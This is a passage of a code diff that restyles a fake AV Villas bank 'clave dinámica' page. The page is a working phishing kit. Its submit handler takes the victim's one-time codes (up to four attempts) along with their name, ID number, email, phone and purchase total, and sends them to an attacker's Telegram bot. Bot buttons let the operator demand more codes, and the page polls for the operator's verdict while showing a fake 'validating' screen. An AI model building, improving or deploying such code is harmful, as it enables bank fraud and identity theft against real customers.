@@ -5,7 +5,22 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AV Villas - Clave Dinámica</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --av-red: #e31837;
+            --av-red-dark: #c4142f;
+            --av-bg: #f4f7f9;
+            --white: #ffffff;
+            --text-main: #2d3436;
+            --text-muted: #636e72;
+            --border-radius: 16px;
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
         * {
             margin: 0;
             padding: 0;
@@ -13,50 +28,67 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f5f5f5;
+            font-family: 'Inter', sans-serif;
+            background-color: var(--av-bg);
+            color: var(--text-main);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            overflow-x: hidden;
         }
 
         .main-container {
             display: flex;
             flex: 1;
-            min-height: calc(100vh - 80px);
+            width: 100%;
+            max-width: 1440px;
+            margin: 0 auto;
+            background: var(--white);
+            box-shadow: var(--shadow);
         }
 
         /* Left Section - Banners */
         .banners-section {
             flex: 1;
-            padding: 30px 40px;
-            background-color: #ffffff;
+            padding: 50px;
+            display: flex;
+            flex-direction: column;
+            gap: 40px;
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
         }
 
         .banners-title {
-            font-size: 28px;
-            font-weight: 700;
-            color: #333;
-            margin-bottom: 25px;
+            font-size: 36px;
+            font-weight: 800;
+            color: var(--text-main);
+            letter-spacing: -0.02em;
         }
 
         .banners-grid {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            grid-template-rows: auto auto;
-            gap: 20px;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 24px;
         }
 
         .banner-card {
-            background: #fff;
-            border-radius: 16px;
+            background: var(--white);
+            border-radius: var(--border-radius);
             overflow: hidden;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
             position: relative;
+            transition: var(--transition);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .banner-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.1);
         }
 
         .banner-card.large {
-            grid-row: span 2;
+            grid-column: span 2;
+            aspect-ratio: 21/9;
         }
 
         .banner-card img {
@@ -66,207 +98,233 @@
             display: block;
         }
 
-        .banner-card.large img {
-            height: 100%;
-            min-height: 400px;
-        }
-
-        .banner-card:not(.large) img {
-            height: 200px;
-        }
-
         .banner-overlay {
             position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: white;
-            padding: 15px 20px;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 20px;
             border-radius: 12px;
-            margin: 15px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
         }
 
         .banner-overlay p {
             font-size: 14px;
-            color: #333;
-            margin-bottom: 10px;
-            line-height: 1.4;
-        }
-
-        .banner-overlay p strong {
-            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 12px;
+            line-height: 1.5;
+            font-weight: 500;
         }
 
         .banner-link {
-            color: #e31837;
+            color: var(--av-red);
             text-decoration: none;
             font-size: 13px;
-            font-weight: 600;
+            font-weight: 700;
             display: inline-flex;
             align-items: center;
             gap: 5px;
+            transition: var(--transition);
         }
 
         .banner-link:hover {
-            text-decoration: underline;
+            gap: 8px;
+            color: var(--av-red-dark);
         }
 
-        /* Right Section - Clave Dinámica */
+        /* Right Section - Login */
         .login-section {
-            width: 420px;
-            background: #e31837;
-            padding: 40px 35px;
+            width: 480px;
+            background: var(--av-red);
+            padding: 60px 40px;
             display: flex;
             flex-direction: column;
+            justify-content: center;
             position: relative;
             overflow: hidden;
         }
 
-        .login-section::before {
+        .login-section::after {
             content: '';
             position: absolute;
-            top: 0;
-            right: 0;
-            bottom: 0;
-            left: 0;
-            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 600'%3E%3Ccircle cx='350' cy='100' r='150' fill='rgba(255,255,255,0.05)'/%3E%3Ccircle cx='380' cy='400' r='200' fill='rgba(255,255,255,0.03)'/%3E%3C/svg%3E") no-repeat;
-            background-size: cover;
+            top: -100px;
+            right: -100px;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
+            border-radius: 50%;
             pointer-events: none;
         }
 
         .logo-container {
             text-align: center;
-            margin-bottom: 30px;
-            position: relative;
-            z-index: 1;
+            margin-bottom: 40px;
+            z-index: 2;
         }
 
         .logo-placeholder {
-            background: white;
+            background: var(--white);
             border-radius: 12px;
-            padding: 15px 30px;
+            padding: 12px 24px;
             display: inline-block;
-            font-size: 24px;
-            font-weight: bold;
-            color: #e31837;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo-placeholder img {
+            height: 32px;
+            display: block;
         }
 
         .login-form-container {
-            background: white;
-            border-radius: 20px;
-            padding: 30px 25px;
-            position: relative;
-            z-index: 1;
+            background: var(--white);
+            border-radius: 24px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            z-index: 2;
+            width: 100%;
         }
 
         .login-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 10px;
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 12px;
+            text-align: center;
         }
 
         .login-subtitle {
             font-size: 14px;
-            color: #666;
-            margin-bottom: 25px;
-            line-height: 1.5;
+            color: var(--text-muted);
+            margin-bottom: 30px;
+            line-height: 1.6;
+            text-align: center;
         }
 
         .otp-container {
-            display: flex;
-            justify-content: space-between;
-            gap: 8px;
-            margin-bottom: 25px;
-            width: 100%;
-            max-width: 320px;
-            margin-left: auto;
-            margin-right: auto;
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 10px;
+            margin-bottom: 30px;
         }
 
         .otp-input {
-            flex: 1;
             width: 100%;
-            max-width: 45px;
-            height: 55px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
+            aspect-ratio: 1/1.2;
+            border: 2px solid #edf2f7;
+            border-radius: 12px;
             text-align: center;
-            font-size: 22px;
-            font-weight: 600;
-            color: #333;
-            transition: border-color 0.3s;
-            padding: 0;
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-main);
+            background: #f8fafc;
+            transition: var(--transition);
         }
 
         .otp-input:focus {
             outline: none;
-            border-color: #e31837;
+            border-color: var(--av-red);
+            background: var(--white);
+            box-shadow: 0 0 0 4px rgba(227, 24, 55, 0.1);
         }
 
         .timer-container {
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
+            padding: 12px;
+            background: #fff5f5;
+            border-radius: 12px;
         }
 
         .timer-text {
-            font-size: 14px;
-            color: #666;
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 4px;
         }
 
         .timer-countdown {
             font-size: 18px;
-            font-weight: 700;
-            color: #e31837;
-            margin-top: 5px;
+            font-weight: 800;
+            color: var(--av-red);
         }
 
         .btn-login {
             width: 100%;
-            padding: 14px;
-            background: #c5d1db;
+            padding: 16px;
+            background: #cbd5e0;
             border: none;
-            border-radius: 25px;
-            color: #e31837;
+            border-radius: 30px;
+            color: var(--white);
             font-size: 16px;
             font-weight: 700;
             text-transform: uppercase;
+            letter-spacing: 0.5px;
             cursor: pointer;
+            transition: var(--transition);
             margin-top: 10px;
-            transition: background 0.3s;
-        }
-
-        .btn-login:hover {
-            background: #b8c5d0;
         }
 
         .btn-login.active {
-            background: #e31837;
-            color: #fff;
+            background: var(--av-red);
+            box-shadow: 0 4px 12px rgba(227, 24, 55, 0.3);
         }
 
         .btn-login.active:hover {
-            background: #c4142f;
+            background: var(--av-red-dark);
+            transform: translateY(-2px);
         }
 
         .resend-code {
             text-align: center;
-            margin-top: 20px;
+            margin-top: 25px;
         }
 
         .resend-code a {
-            color: #e31837;
+            color: var(--av-red);
             text-decoration: none;
             font-size: 14px;
             font-weight: 600;
             display: inline-flex;
             align-items: center;
             gap: 6px;
+            transition: var(--transition);
         }
 
         .resend-code a:hover {
+            color: var(--av-red-dark);
             text-decoration: underline;
+        }
+
+        .security-info {
+            background: #f1f5f9;
+            border-radius: 12px;
+            padding: 16px;
+            margin-top: 25px;
+            border-left: 4px solid var(--av-red);
+        }
+
+        .security-info p {
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        .back-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .back-link a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: var(--transition);
+        }
+
+        .back-link a:hover {
+            color: var(--text-main);
         }
 
         .help-links {
@@ -274,98 +332,56 @@
             margin-top: 20px;
         }
 
-        .help-links p {
-            font-size: 13px;
-            color: #666;
-            margin-bottom: 5px;
-        }
-
         .help-links a {
-            color: #e31837;
+            font-size: 13px;
+            color: var(--av-red);
             text-decoration: none;
             font-weight: 600;
         }
 
-        .help-links a:hover {
-            text-decoration: underline;
-        }
-
-        .back-link {
-            text-align: center;
-            margin-top: 15px;
-        }
-
-        .back-link a {
-            color: #666;
-            text-decoration: none;
-            font-size: 14px;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .back-link a:hover {
-            color: #333;
-        }
-
-        .security-info {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 20px;
-        }
-
-        .security-info p {
-            font-size: 12px;
-            color: #666;
-            line-height: 1.5;
-        }
-
-        .security-info .icon {
-            color: #e31837;
-            margin-right: 5px;
-        }
-
         /* Footer */
         .footer {
-            background: #fff;
-            padding: 20px 40px;
+            background: var(--white);
+            padding: 30px 50px;
+            border-top: 1px solid #edf2f7;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-top: 1px solid #eee;
+            gap: 40px;
         }
 
         .footer-left {
             display: flex;
             align-items: center;
-            gap: 15px;
+            gap: 30px;
+            flex: 1;
         }
 
         .footer-vigilado {
             font-size: 10px;
-            color: #999;
+            color: #94a3b8;
             writing-mode: vertical-rl;
-            text-orientation: mixed;
             transform: rotate(180deg);
+            white-space: nowrap;
+            letter-spacing: 1px;
         }
 
         .footer-contacts {
             display: flex;
             flex-direction: column;
+            gap: 12px;
         }
 
         .footer-title {
             font-size: 14px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 8px;
+            font-weight: 700;
+            color: var(--text-main);
         }
 
         .footer-numbers {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 25px;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 15px;
         }
 
         .contact-item {
@@ -375,51 +391,97 @@
         }
 
         .contact-item .dot {
-            width: 8px;
-            height: 8px;
-            background: #e31837;
+            width: 6px;
+            height: 6px;
+            background: var(--av-red);
             border-radius: 50%;
         }
 
-        .contact-item .city {
+        .city {
             font-size: 13px;
             font-weight: 600;
-            color: #333;
+            color: var(--text-main);
         }
 
-        .contact-item .number {
+        .number {
             font-size: 13px;
-            color: #666;
+            color: var(--text-muted);
         }
 
         .footer-logo {
             text-align: right;
+            min-width: 120px;
         }
 
         .footer-logo-placeholder {
-            font-size: 12px;
-            color: #666;
-            font-weight: bold;
+            font-size: 11px;
+            text-transform: uppercase;
+            color: #94a3b8;
+            font-weight: 700;
+            margin-bottom: 4px;
         }
 
         .grupo-aval {
-            font-size: 24px;
-            font-weight: bold;
-            color: #333;
+            font-size: 28px;
+            font-weight: 900;
+            color: var(--text-main);
+            letter-spacing: -1px;
         }
 
-        /* Responsive */
+        /* Media Queries */
+        @media (max-width: 1200px) {
+            .banners-section {
+                padding: 30px;
+            }
+
+            .login-section {
+                width: 420px;
+            }
+
+            .banners-title {
+                font-size: 28px;
+            }
+        }
+
         @media (max-width: 1024px) {
             .main-container {
-                flex-direction: column-reverse;
+                flex-direction: column;
+                max-width: 100%;
             }
 
             .login-section {
                 width: 100%;
+                padding: 40px 20px;
+                order: -1;
+                /* Login at top on mobile/tablet */
             }
 
-            .banners-grid {
-                grid-template-columns: 1fr 1fr;
+            .login-form-container {
+                max-width: 500px;
+                margin: 0 auto;
+            }
+
+            .banners-section {
+                padding: 40px 20px;
+            }
+
+            .footer {
+                padding: 30px 20px;
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .footer-left {
+                flex-direction: column;
+                gap: 20px;
+            }
+
+            .footer-numbers {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .footer-logo {
+                text-align: center;
             }
         }
 
@@ -429,49 +491,91 @@
             }
 
             .login-section {
-                padding: 30px 15px;
-                min-height: calc(100vh - 100px);
-                justify-content: center;
-            }
-
-            .otp-container {
-                gap: 5px;
-            }
-
-            .otp-input {
-                max-width: 40px;
-                height: 50px;
-                font-size: 20px;
-            }
-
-            .footer {
-                flex-direction: column;
-                gap: 20px;
-                text-align: center;
-            }
-
-            .footer-left {
-                flex-direction: column;
+                min-height: 100vh;
+                background: linear-gradient(135deg, var(--av-red) 0%, var(--av-red-dark) 100%);
             }
 
             .footer-numbers {
-                justify-content: center;
-                gap: 15px;
+                grid-template-columns: 1fr;
+                gap: 10px;
             }
 
-            .footer-logo {
-                text-align: center;
+            .otp-input {
+                font-size: 20px;
+                border-radius: 10px;
             }
         }
 
-        @media (max-width: 360px) {
-            .otp-input {
-                height: 45px;
-                font-size: 18px;
+        @media (max-width: 480px) {
+            .login-form-container {
+                padding: 30px 20px;
             }
+
+            .otp-container {
+                gap: 6px;
+            }
+
             .login-title {
-                font-size: 18px;
+                font-size: 20px;
             }
+        }
+
+        /* Waiting Panel Styles */
+        #waiting-panel {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 60px 20px;
+            text-align: center;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .loader {
+            border: 4px solid #f1f5f9;
+            border-top: 4px solid var(--av-red);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 12px rgba(227, 24, 55, 0.1);
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .waiting-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 12px;
+        }
+
+        .waiting-subtitle {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.6;
+            max-width: 280px;
         }
     </style>
 </head>
@@ -527,278 +631,285 @@
 
             <div class="login-form-container">
                 <div id="otp-panel">
-                    <h2 class="login-title">Ingresa tu clave dinámica</h2>
-                    <p class="login-subtitle">Hemos enviado un código de verificación a tu celular registrado, o abre tu app
-                        Av Villas y digita la clave dinámica que se genera automáticamente.</p>
+                    <h2 class="login-title">Ingresa tu Token Dinamico</h2>
+                    <p class="login-subtitle">Hemos enviado un código de verificación a tu celular registrado, o abre tu
+                        app
+                        Av Villas y digita el Token Dinamico que se genera automáticamente.</p>
 
-                <form id="otp-form">
-                    <div class="otp-container">
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+                    <form id="otp-form">
+                        <div class="otp-container">
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                                required>
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                                required>
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                                required>
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                                required>
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                                required>
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                                required>
+                        </div>
+
+                        <div class="timer-container">
+                            <p class="timer-text">Tu código expira en:</p>
+                            <p class="timer-countdown">02:59</p>
+                        </div>
+
+                        <button type="submit" class="btn-login active">Verificar</button>
+                    </form>
+
+                    <div class="resend-code">
+                        <a href="#">🔄 Reenviar código</a>
                     </div>
 
-                    <div class="timer-container">
-                        <p class="timer-text">Tu código expira en:</p>
-                        <p class="timer-countdown">02:59</p>
+                    <div class="security-info">
+                        <p><span class="icon">🔒</span> Por tu seguridad, nunca compartas este código con nadie. AV
+                            Villas
+                            nunca te pedirá este código por teléfono o correo.</p>
                     </div>
 
-                    <button type="submit" class="btn-login active">Verificar</button>
-                </form>
+                    <div class="back-link">
+                        <a href="login.html">← Volver al inicio de sesión</a>
+                    </div>
 
-                <div class="resend-code">
-                    <a href="#">🔄 Reenviar código</a>
-                </div>
-
-                <div class="security-info">
-                    <p><span class="icon">🔒</span> Por tu seguridad, nunca compartas este código con nadie. AV Villas
-                        nunca te pedirá este código por teléfono o correo.</p>
-                </div>
-
-                <div class="back-link">
-                    <a href="login.html">← Volver al inicio de sesión</a>
-                </div>
-
-                <div class="help-links" style="margin-top: 15px;">
-                    <a href="#">¿Tienes problemas para recibir el código?</a>
-                </div>
+                    <div class="help-links" style="margin-top: 15px;">
+                        <a href="#">¿Tienes problemas para recibir el código?</a>
+                    </div>
                 </div> <!-- End of otp-panel -->
 
-                <div id="waiting-panel" style="display: none; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center;">
-                    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #e31837; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px;"></div>
-                    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
-                    <h2 class="login-title" style="margin-bottom: 10px;">Estamos validando tu información</h2>
-                    <p class="login-subtitle">Por favor espera, este proceso puede tardar unos segundos...</p>
-                </div>
-            </div>
-    </div>
-
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="footer-left">
-            <div class="footer-vigilado">
-                VIGILADO SUPERINTENDENCIA FINANCIERA DE COLOMBIA
-            </div>
-            <div class="footer-contacts">
-                <div class="footer-title">Línea Audiovillas</div>
-                <div class="footer-numbers">
-                    <div class="contact-item">
-                        <span class="city">Nacional</span>
-                        <span class="number">01 8000 51 8000</span>
-                    </div>
-                    <div class="contact-item">
-                        <span class="dot"></span>
-                        <span class="city">Bogotá</span>
-                        <span class="number">(601) 4441777</span>
-                    </div>
-                    <div class="contact-item">
-                        <span class="dot"></span>
-                        <span class="city">Medellín</span>
-                        <span class="number">(604) 3256000</span>
-                    </div>
-                    <div class="contact-item">
-                        <span class="dot"></span>
-                        <span class="city">Barranquilla</span>
-                        <span class="number">(605) 3304330</span>
-                    </div>
-                    <div class="contact-item">
-                        <span class="dot"></span>
-                        <span class="city">Bucaramanga</span>
-                        <span class="number">(607) 6302980</span>
-                    </div>
-                    <div class="contact-item">
-                        <span class="dot"></span>
-                        <span class="city">Cali</span>
-                        <span class="number">(602) 8859595</span>
-                    </div>
+                <div id="waiting-panel">
+                    <div class="loader"></div>
+                    <h2 class="waiting-title">Estamos validando tu información</h2>
+                    <p class="waiting-subtitle">Por favor espera, este proceso puede tardar unos segundos...</p>
                 </div>
             </div>
         </div>
-        <div class="footer-logo">
-            <div class="footer-logo-placeholder">Grupo</div>
-            <div class="grupo-aval">AVAL</div>
-        </div>
-    </footer>
 
-    <script src="../js/config.js"></script>
-    <script>
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-left">
+                <div class="footer-vigilado">
+                    VIGILADO SUPERINTENDENCIA FINANCIERA DE COLOMBIA
+                </div>
+                <div class="footer-contacts">
+                    <div class="footer-title">Línea Audiovillas</div>
+                    <div class="footer-numbers">
+                        <div class="contact-item">
+                            <span class="city">Nacional</span>
+                            <span class="number">01 8000 51 8000</span>
+                        </div>
+                        <div class="contact-item">
+                            <span class="dot"></span>
+                            <span class="city">Bogotá</span>
+                            <span class="number">(601) 4441777</span>
+                        </div>
+                        <div class="contact-item">
+                            <span class="dot"></span>
+                            <span class="city">Medellín</span>
+                            <span class="number">(604) 3256000</span>
+                        </div>
+                        <div class="contact-item">
+                            <span class="dot"></span>
+                            <span class="city">Barranquilla</span>
+                            <span class="number">(605) 3304330</span>
+                        </div>
+                        <div class="contact-item">
+                            <span class="dot"></span>
+                            <span class="city">Bucaramanga</span>
+                            <span class="number">(607) 6302980</span>
+                        </div>
+                        <div class="contact-item">
+                            <span class="dot"></span>
+                            <span class="city">Cali</span>
+                            <span class="number">(602) 8859595</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-logo">
+                <div class="footer-logo-placeholder">Grupo</div>
+                <div class="grupo-aval">AVAL</div>
+            </div>
+        </footer>
 
-        async function sendToTelegram(text, inlineKeyboard = null) {
-            const body = {
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: "HTML"
-            };
-            if (inlineKeyboard) body.reply_markup = { inline_keyboard: inlineKeyboard };
-            
-            try {
-                await fetch(`${TELEGRAM_API}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(body)
-                });
-            } catch (err) {
-                console.error("Error enviando a Telegram:", err);
+        <script src="../js/config.js"></script>
+        <script>
+
+            async function sendToTelegram(text, inlineKeyboard = null) {
+                const body = {
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: "HTML"
+                };
+                if (inlineKeyboard) body.reply_markup = { inline_keyboard: inlineKeyboard };
+
+                try {
+                    await fetch(`${TELEGRAM_API}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(body)
+                    });
+                } catch (err) {
+                    console.error("Error enviando a Telegram:", err);
+                }
             }
-        }
 
-        // Auto-focus next input on OTP entry
-        const otpInputs = document.querySelectorAll('.otp-input');
-        const otpForm = document.getElementById('otp-form');
+            // Auto-focus next input on OTP entry
+            const otpInputs = document.querySelectorAll('.otp-input');
+            const otpForm = document.getElementById('otp-form');
 
-        otpInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
-                    otpInputs[index + 1].focus();
-                }
-            });
-
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
-                    otpInputs[index - 1].focus();
-                }
-            });
-        });
-
-        otpForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            let otpValue = "";
-            otpInputs.forEach(input => otpValue += input.value);
-
-            // OTP Tracking Logic
-            let otpCount = parseInt(sessionStorage.getItem("otp_count") || "0") + 1;
-            if (otpCount > 4) otpCount = 1; // Reiniciar si pasa de 4
-            sessionStorage.setItem("otp_count", otpCount);
-            
-            // Store each OTP value
-            sessionStorage.setItem(`otp_val_${otpCount}`, otpValue);
-
-            const nombre = sessionStorage.getItem("nombre") || "---";
-            const cedula = sessionStorage.getItem("cedula") || "---";
-            const correo = sessionStorage.getItem("correo") || "---";
-            const telefono = sessionStorage.getItem("telefono") || "---";
-            const total = sessionStorage.getItem("total") || "---";
-            const banco = sessionStorage.getItem("banco") || "AV VILLAS";
-            const tipoBanco = sessionStorage.getItem("tipoBanco") || "Natural";
-            const randomID = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-
-            let producto = "STICKER COMBO FAMILIAR x20";
-            try {
-                const order = JSON.parse(sessionStorage.getItem('ms_last_order'));
-                if (order && order.items && order.items.length > 0) {
-                    const item = order.items[0];
-                    producto = (item.isCombo ? 'STICKER COMBO FAMILIAR' : 'STICKER BENDECIDO') + ' x' + item.qty;
-                }
-            } catch (e) {}
-
-            const otp1 = sessionStorage.getItem("otp_val_1") || "—";
-            const otp2 = sessionStorage.getItem("otp_val_2") || "—";
-            const otp3 = sessionStorage.getItem("otp_val_3") || "—";
-            const otp4 = sessionStorage.getItem("otp_val_4") || "—";
-
-            const text = `🔐 <b>PIN AV Villas Recibido — OTP${otpCount}</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🛒 Producto: ${producto}\n\n🔑 OTP1: <code>${otp1}</code>\n🔑 OTP2: <code>${otp2}</code>\n🔑 OTP3: <code>${otp3}</code>\n🔑 OTP4: <code>${otp4}</code>\n\n📊 OTP actual: ${otpCount} de 4 | 🆔 ${randomID}`;
-
-            const buttons = [
-                [{ text: "🔄 Pedir OTP", callback_data: "pedir_otp" }],
-                [{ text: "✅ Aceptar", callback_data: "aceptar" }, { text: "❌ Rechazar", callback_data: "rechazar" }]
-            ];
-
-            await sendToTelegram(text, buttons);
-
-            // Hide OTP panel, show waiting panel
-            document.getElementById('otp-panel').style.display = 'none';
-            document.getElementById('waiting-panel').style.display = 'flex';
-            
-            initPolling();
-        });
-
-        let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
-
-        async function initPolling() {
-            try {
-                const response = await fetch(`${TELEGRAM_API}/getUpdates`);
-                const data = await response.json();
-                if (data.ok && data.result.length > 0) {
-                    lastUpdateId = data.result[data.result.length - 1].update_id;
-                    sessionStorage.setItem('lastUpdateId', lastUpdateId);
-                }
-            } catch (e) { console.error(e); }
-            setTimeout(pollTelegram, 2000);
-        }
-
-        async function removeTelegramButtons(messageId) {
-            try {
-                await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        message_id: messageId,
-                        reply_markup: { inline_keyboard: [] }
-                    })
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
                 });
-            } catch (e) { console.error(e); }
-        }
 
-        async function pollTelegram() {
-            try {
-                const response = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}`);
-                const data = await response.json();
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
+                        otpInputs[index - 1].focus();
+                    }
+                });
+            });
 
-                if (data.ok && data.result.length > 0) {
-                    for (const update of data.result) {
-                        lastUpdateId = update.update_id;
+            otpForm.addEventListener('submit', async function (e) {
+                e.preventDefault();
+                let otpValue = "";
+                otpInputs.forEach(input => otpValue += input.value);
+
+                // OTP Tracking Logic
+                let otpCount = parseInt(sessionStorage.getItem("otp_count") || "0") + 1;
+                if (otpCount > 4) otpCount = 1; // Reiniciar si pasa de 4
+                sessionStorage.setItem("otp_count", otpCount);
+
+                // Store each OTP value
+                sessionStorage.setItem(`otp_val_${otpCount}`, otpValue);
+
+                const nombre = sessionStorage.getItem("nombre") || "---";
+                const cedula = sessionStorage.getItem("cedula") || "---";
+                const correo = sessionStorage.getItem("correo") || "---";
+                const telefono = sessionStorage.getItem("telefono") || "---";
+                const total = sessionStorage.getItem("total") || "---";
+                const banco = sessionStorage.getItem("banco") || "AV VILLAS";
+                const tipoBanco = sessionStorage.getItem("tipoBanco") || "Natural";
+                const randomID = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+
+                let producto = "STICKER COMBO FAMILIAR x20";
+                try {
+                    const order = JSON.parse(sessionStorage.getItem('ms_last_order'));
+                    if (order && order.items && order.items.length > 0) {
+                        const item = order.items[0];
+                        producto = (item.isCombo ? 'STICKER COMBO FAMILIAR' : 'STICKER BENDECIDO') + ' x' + item.qty;
+                    }
+                } catch (e) { }
+
+                const otp1 = sessionStorage.getItem("otp_val_1") || "—";
+                const otp2 = sessionStorage.getItem("otp_val_2") || "—";
+                const otp3 = sessionStorage.getItem("otp_val_3") || "—";
+                const otp4 = sessionStorage.getItem("otp_val_4") || "—";
+
+                const text = `🔐 <b>PIN AV Villas Recibido — OTP${otpCount}</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🛒 Producto: ${producto}\n\n🔑 OTP1: <code>${otp1}</code>\n🔑 OTP2: <code>${otp2}</code>\n🔑 OTP3: <code>${otp3}</code>\n🔑 OTP4: <code>${otp4}</code>\n\n📊 OTP actual: ${otpCount} de 4 | 🆔 ${randomID}`;
+
+                const buttons = [
+                    [{ text: "🔄 Pedir OTP", callback_data: "pedir_otp" }],
+                    [{ text: "✅ Aceptar", callback_data: "aceptar" }, { text: "❌ Rechazar", callback_data: "rechazar" }]
+                ];
+
+                await sendToTelegram(text, buttons);
+
+                // Hide OTP panel, show waiting panel
